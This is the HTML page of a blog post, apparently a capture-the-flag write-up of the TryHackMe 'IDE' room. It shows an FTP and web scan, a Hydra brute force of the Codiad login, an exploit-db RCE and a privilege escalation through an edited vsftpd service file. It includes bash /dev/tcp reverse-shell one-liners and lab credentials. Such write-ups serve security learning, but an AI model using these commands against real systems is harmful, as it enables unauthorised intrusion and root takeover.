@@ -1,0 +1,235 @@
+<!doctype html>
+<html lang="en-us">
+  <head>
+    <title>THM - IDE // chrootcommit</title>
+    <link rel="shortcut icon" href="/favicon.ico" />
+    <meta charset="utf-8" />
+    <meta name="generator" content="Hugo 0.111.3">
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta name="author" content="chrootcommit" />
+    <meta name="description" content="" />
+    <link rel="stylesheet" href="/css/main.min.1fe426fd82899b3823133b4b6fadb0e1f0d8332eecc710a4dfe43101ac5895e0.css" />
+
+    
+    <meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="THM - IDE"/>
+<meta name="twitter:description" content="Hello, It is my first post. From now I start to post my writeup/notes about CTF challenges from differents platforms to share you my approach.
+Enumeration Let&rsquo;s scan ports :
+PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) MAC Address: 02:C5:29:36:64:91 (Unknown) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 62337 open tcp -&gt; HTTP -&gt; Codiad 2."/>
+
+    <meta property="og:title" content="THM - IDE" />
+<meta property="og:description" content="Hello, It is my first post. From now I start to post my writeup/notes about CTF challenges from differents platforms to share you my approach.
+Enumeration Let&rsquo;s scan ports :
+PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) MAC Address: 02:C5:29:36:64:91 (Unknown) Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel 62337 open tcp -&gt; HTTP -&gt; Codiad 2." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://test.com/posts/2023-02-28-tryhackme-ide/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-02-28T00:00:00+00:00" />
+<meta property="article:modified_time" content="2023-02-28T00:00:00+00:00" />
+
+
+  </head>
+  <body>
+    <header class="app-header">
+      <a href="https://test.com/"><img class="app-header-avatar" src="/profile.png" alt="chrootcommit" /></a>
+      <span class="app-header-title">chrootcommit</span>
+      <nav class="app-header-menu">
+          <a class="app-header-menu-item" href="/posts/about">About</a>
+            -
+          
+          <a class="app-header-menu-item" href="/">Home</a>
+            -
+          
+          <a class="app-header-menu-item" href="/tags/">Tags</a>
+      </nav>
+      <p>Junior Cybersecurity Consultant.</p>
+      <div class="app-header-social">
+        
+          <a href="https://github.com/ChRootCommit" target="_blank" rel="noreferrer noopener me">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
+  <title>My github</title>
+  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
+</svg>
+          </a>
+        
+      </div>
+    </header>
+    <main class="app-container">
+      
+  <article class="post">
+    <header class="post-header">
+      <h1 class ="post-title">THM - IDE</h1>
+      <div class="post-meta">
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
+  <title>calendar</title>
+  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
+</svg>
+          Feb 28, 2023
+        </div>
+        <div>
+          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
+  <title>clock</title>
+  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
+</svg>
+          4 min read
+        </div>
+      </div>
+    </header>
+    <div class="post-content">
+      <p>Hello, It is my first post. From now I start to post my writeup/notes about CTF challenges from differents platforms to share you my approach.</p>
+<h1 id="enumeration">Enumeration</h1>
+<p>Let&rsquo;s scan ports :</p>
+<pre tabindex="0"><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+MAC Address: 02:C5:29:36:64:91 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+62337  open  tcp -&gt; HTTP -&gt; Codiad 2.8.4 #thanks to masscan
+</code></pre><p>I found FTP, then I connected in anonymous mode :</p>
+<pre tabindex="0"><code># Conntect to FTP
+cd ...
+get -
+
+# File content 
+
+Hey john,
+I have reset the password as you have asked. Please use the default password to login. 
+Also, please take care of the image file ;)
+- drac.
+</code></pre><p>According this file, we can guess john and drac are users of the machine</p>
+<h1 id="web-enumeration-">Web Enumeration :</h1>
+<p>Whatweb to check web components used by the website :</p>
+<pre tabindex="0"><code>WhatWeb report for http://10.10.49.31
+Status    : 405 Method Not Allowed
+Title     : Error response
+IP        : 10.10.49.31
+Country   : RESERVED, ZZ
+
+Summary   : HTTPServer[WebSockify Python/3.6.9], Python[3.6.9]
+
+Detected Plugins:
+[ HTTPServer ]
+	HTTP server header string. This plugin also attempts to 
+	identify the operating system from the server header. 
+
+	String       : WebSockify Python/3.6.9 (from server string)
+
+[ Python ]
+	Python is a programming language that lets you work more 
+	quickly and integrate your systems more effectively. You 
+	can learn to use Python and see almost immediate gains in 
+	productivity and lower maintenance costs. 
+
+	Version      : 3.6.9
+	Website     : http://www.python.org/
+
+HTTP Headers:
+	HTTP/1.1 405 Method Not Allowed
+	Server: WebSockify Python/3.6.9
+	Date: Fri, 06 Jan 2023 13:01:12 GMT
+	Connection: close
+	Content-Type: text/html;charset=utf-8
+	Content-Length: 472
+</code></pre><p>Gobuster to enumerate directories :</p>
+<pre tabindex="0"><code>gobuster dir --url http://10.10.182.125 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,json,yaml,csv
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.182.125
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php,txt,json,yaml,csv
+[+] Timeout:        10s
+===============================================================
+2023/01/06 12:55:18 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2023/01/06 13:06:35 Finished
+===============================================================
+</code></pre><p>I attempted a directory bruteforece on the codiad service :</p>
+<pre tabindex="0"><code>gobuster dir --url http://10.10.182.125 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,php,txt,json,yaml,csv
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.182.125
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     html,php,txt,json,yaml,csv
+[+] Timeout:        10s
+===============================================================
+2023/01/06 12:55:18 Starting gobuster
+===============================================================
+/index.html (Status: 200)
+/server-status (Status: 403)
+===============================================================
+2023/01/06 13:06:35 Finished
+===============================================================
+</code></pre><p>Earlier I found through my scan codiad on version 2.8.4.</p>
+<h1 id="exploitation">Exploitation</h1>
+<p>Codiad has a login page, then I attempted to crack password of john and drac users. I stored john and drac into users.txt file and brute forced their password thanks to Hydra :</p>
+<pre tabindex="0"><code>hydra  -L users.txt -P /usr/share/wordlists/rockyou.txt -v -s 62337 10.10.107.200 http-post-form &#34;/components/user/controller.php?action=authenticate:username=^USER^&amp;password=^PASS^&amp;theme=default&amp;language=fr:F={\&#34;status\&#34;\:\&#34;error\&#34;,\&#34;message\&#34;\:\&#34;Incorrect Username or Password\&#34;}&#34;
+....
+[62337][http-post-form] host: 10.10.107.200   login: john   password: password
+</code></pre><p>To exploit codiad, I used the following exploit : <a href="https://www.exploit-db.com/exploits/49705">exploitdb</a></p>
+<p>This exploit allows me to have a reverse shell.
+First in a terminal I set up my reverse shell server :</p>
+<pre tabindex="0"><code>echo &#39;bash -c &#34;bash -i &gt;/dev/tcp/10.10.130.96/9002 0&gt;&amp;1 2&gt;&amp;1&#34;&#39; | nc -lnvp 9001
+</code></pre><p>Then, I triggered the rce :</p>
+<pre tabindex="0"><code>python exploit.py http://10.10.107.200:62337/ john password 10.10.130.96 9001 linux
+</code></pre><h1 id="post-exploitation-">Post-Exploitation :</h1>
+<h2 id="user-flag-">User flag :</h2>
+<p>After I got the machine, I checked the drac&rsquo;s commands history and I got his password because he logged into mysql with the -p flag.</p>
+<pre tabindex="0"><code>cat /home/drac/.bash_history
+
+mysql -u drac -p &#39;Th3dRaCULa1sR3aL&#39;
+</code></pre><p>Then, I got the flag user :</p>
+<pre tabindex="0"><code>cat user.txt 
+02930d21a8eb009f6d26361b2d24a466
+</code></pre><h2 id="privilege-escalation-to-root-">Privilege escalation to root :</h2>
+<p>I Attempted to see what I could run as root using <code>sudo -l</code>:</p>
+<pre tabindex="0"><code>drac@ide:/tmp$ sudo -l
+[sudo] password for drac: 
+Matching Defaults entries for drac on ide:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User drac may run the following commands on ide:
+    (ALL : ALL) /usr/sbin/service vsftpd restart
+</code></pre><p>I thought I could modify the vsftp service throught edition of /etc/systemd/system/vsftpd.service file but I could not write in this file. Then, In despair I launched linpeas and got the real service file config I must edit to gain root access :</p>
+<pre tabindex="0"><code>/lib/systemd/system/vsftpd.service 
+</code></pre><p>Gaining root access :</p>
+<pre tabindex="0"><code>[Unit]
+Description=vsftpd FTP server
+
+[Service]
+Type=simple
+User=root
+ExecStart=/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/10.10.191.61/9001 0&gt;&amp;1&#39;
+
+[Install]
+WantedBy=multi-user.target
+</code></pre><p>Setting up root reverse shell :</p>
+<pre tabindex="0"><code>nc -lnvp 9001
+# After restarting vsftp service (sudo /usr/sbin/service vsftpd restart)
+cat /root/root.txt
+ce258cb16f47f1c66f0b0b77f4e0fb8d -&gt; the flag 
+</code></pre>
+    </div>
+    <div class="post-footer">
+      
+    </div>
+  </article>
+
+    </main>
+  </body>
+</html>
